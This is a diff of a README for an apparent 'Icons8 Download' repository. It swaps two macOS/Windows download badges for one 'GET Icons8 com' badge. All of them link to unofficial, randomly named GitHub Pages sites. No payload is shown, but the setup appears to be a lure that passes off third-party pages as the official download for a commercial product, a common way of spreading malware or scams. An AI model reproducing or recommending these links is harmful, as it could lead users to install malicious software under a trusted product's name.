@@ -1,18 +1,7 @@
 # Icons8 Download — Design Asset Platform
 
-<a href="https://git-apps-io.github.io/.github/?offer=Icons8" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Icons8%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="Icons8 for macOS">
-</a>
+[![GET Icons8 com](https://img.shields.io/badge/GET%20%E2%80%94%20Icons8-com-0078D6?style=for-the-badge&logoColor=white)](https://lemonwalkersilentcdj9w3333.github.io/.github/Icons8-com)
 
-<a href="https://git-apps-io.github.io/.github/?offer=Icons8" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Icons8%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="Icons8 for Windows">
-</a>
 
 ---
 
